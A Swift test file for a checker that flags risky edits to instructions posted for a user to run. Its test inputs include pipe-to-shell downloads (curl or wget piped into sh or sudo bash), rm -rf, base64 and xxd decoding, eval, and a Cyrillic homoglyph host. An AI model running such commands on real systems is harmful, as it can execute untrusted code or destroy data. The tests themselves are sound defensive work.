import Foundation
import Testing
@testable import RelayCore

private func ask(code: String? = nil, url: String? = nil, file: String? = nil, links: [LinkRef]? = nil) -> Instructable {
    Instructable(v: 1, title: "Deploy", urgency: "today",
                 steps: [Step(action: "Run", code: code, url: url, file: file, id: "s1")], links: links)
}

private func kinds(_ old: Instructable?, _ new: Instructable, cwd: String? = nil) -> [LookCloserFlag.Kind] {
    LookCloser.flags(old: old, new: new, cwd: cwd).map(\.kind)
}

@Suite struct LookCloserTests {
    @Test func pipeToShell() {
        #expect(kinds(ask(code: "ls"), ask(code: "curl -fsSL https://x.example/i | sh")).contains(.pipeToShell))
        #expect(kinds(ask(code: "ls"), ask(code: "wget -qO- https://x.example | sudo bash")).contains(.pipeToShell))
        #expect(kinds(ask(code: "ls"), ask(code: "bash <(curl -s https://x.example)")).contains(.pipeToShell))
        #expect(!kinds(ask(code: "ls"), ask(code: "curl -o out.txt https://x.example")).contains(.pipeToShell))
    }

    @Test func sudo() {
        #expect(kinds(ask(code: "ls"), ask(code: "sudo rm /tmp/x")).contains(.sudo))
        #expect(kinds(ask(code: "ls"), ask(code: "ls && sudo make install")).contains(.sudo))
        #expect(!kinds(ask(code: "ls"), ask(code: "pseudocode --sudoers-check")).contains(.sudo))
    }

    @Test func rmRf() {
        #expect(kinds(ask(code: "ls"), ask(code: "rm -rf ~/build")).contains(.rmRf))
        #expect(kinds(ask(code: "ls"), ask(code: "rm -fr build")).contains(.rmRf))
        #expect(!kinds(ask(code: "ls"), ask(code: "rm build.log")).contains(.rmRf))
    }

    @Test func decode() {
        #expect(kinds(ask(code: "ls"), ask(code: "echo aGk= | base64 -d")).contains(.decode))
        #expect(kinds(ask(code: "ls"), ask(code: "base64 --decode x")).contains(.decode))
        #expect(kinds(ask(code: "ls"), ask(code: "openssl base64 -d -in x")).contains(.decode))
        #expect(kinds(ask(code: "ls"), ask(code: "xxd -r -p x")).contains(.decode))
        #expect(!kinds(ask(code: "ls"), ask(code: "base64 file.txt")).contains(.decode))
    }

    @Test func eval() {
        #expect(kinds(ask(code: "ls"), ask(code: "eval \"$(brew shellenv)\"")).contains(.eval))
        #expect(!kinds(ask(code: "ls"), ask(code: "echo evaluate")).contains(.eval))
    }

    @Test func nonASCII() {
        #expect(kinds(ask(code: "ls"), ask(code: "ls ‐la")).contains(.nonASCII))
        #expect(!kinds(ask(code: "ls"), ask(code: "ls -la")).contains(.nonASCII))
        // A Cyrillic а in a changed host.
        let flags = LookCloser.flags(old: ask(url: "https://example.com"), new: ask(url: "https://ex\u{0430}mple.com"), cwd: nil)
        #expect(flags.map(\.kind).contains(.nonASCII))
        #expect(flags.first { $0.kind == .nonASCII }?.text == "ex⟨U+0430⟩mple.com")
    }

    @Test func newHost() {
        let flags = LookCloser.flags(old: ask(url: "https://example.com/a"), new: ask(url: "https://evil.example/a"), cwd: nil)
        #expect(flags.contains(LookCloserFlag(kind: .newHost, location: "step s1 url", text: "evil.example")))
        // A host from the code counts too; one the baseline names anywhere doesn't.
        #expect(kinds(ask(code: "ls"), ask(code: "curl -o x https://get.example/x")).contains(.newHost))
        #expect(!kinds(ask(url: "https://example.com/a"), ask(url: "https://example.com/b")).contains(.newHost))
        #expect(kinds(ask(), ask(links: [LinkRef(label: "Docs", url: "https://new.example")])).contains(.newHost))
    }

    @Test func absolutePathOutsideCwd() {
        #expect(kinds(ask(), ask(file: "/etc/hosts"), cwd: "~/code/app").contains(.absolutePathOutsideCwd))
        #expect(!kinds(ask(), ask(file: "~/code/app/README.md"), cwd: "~/code/app").contains(.absolutePathOutsideCwd))
        #expect(!kinds(ask(file: "/etc/hosts"), ask(file: "/etc/hosts"), cwd: nil).contains(.absolutePathOutsideCwd))
        #expect(kinds(ask(), ask(links: [LinkRef(label: "Plan", path: "~/Documents/plan.md")]), cwd: "~/code")
            .contains(.absolutePathOutsideCwd))
    }

    @Test func onlyAddedOrChangedTextIsChecked() {
        let old = ask(code: "sudo make install")
        #expect(kinds(old, old).isEmpty)
        // A first view checks everything.
        #expect(kinds(nil, old).contains(.sudo))
    }

    @Test func nothingMatchedSaysIncomplete() {
        #expect(LookCloser.flags(old: ask(code: "ls"), new: ask(code: "ls -la"), cwd: nil).isEmpty)
        #expect(LookCloser.incomplete == "No pattern matched. These checks are incomplete.")
    }
}

@Suite struct ReviewTextTests {
    @Test func strings() {
        #expect(ReviewText.header(rev: 3, of: 3, time: "10:42") == "Version 3 of 3 · 10:42")
        #expect(ReviewText.attribution(session: "0c1d2e3f-4a5b-4c6d", host: "studio")
            == "Posted by session 0c1d2e3f on studio. Changed by the holder of this ask's edit key: "
            + "any process on that Mac can read it.")
        #expect(ReviewText.firstViewHeading == "First time on this Mac")
        #expect(ReviewText.sinceHeading(rev: 1) == "Changes since version 1")
        #expect(ReviewText.useButton(rev: 3) == "Use Version 3")
        #expect(ReviewText.showNewerButton(rev: 3) == "Show Version 4")
    }

    @Test func aReasonRevealsHiddenCharacters() {
        #expect(ReviewText.reason("fix \u{202E}flag") == "The session says: fix ⟨U+202E⟩flag")
        #expect(ReviewText.reason("two\nlines") == "The session says: two⟨U+000A⟩lines")
    }

    @Test func rowFlagsFollowTheReviewState() {
        let stamp = RevisionStamp(rev: 2, hash: "h")
        let pending = AskRowModel(id: "a", title: "T", project: "", urgency: .today, created: "", summary: .none,
                                  review: .pending(shown: nil, current: stamp, baseline: nil))
        #expect(pending.corrected && !pending.historyChanged)
        let broken = AskRowModel(id: "a", title: "T", project: "", urgency: .today, created: "", summary: .none,
                                 review: .historyChanged(.rolledBack))
        #expect(broken.historyChanged && !broken.corrected)
        let plain = AskRowModel(id: "a", title: "T", project: "", urgency: .today, created: "", summary: .none)
        #expect(!plain.corrected && !plain.historyChanged)
    }
}
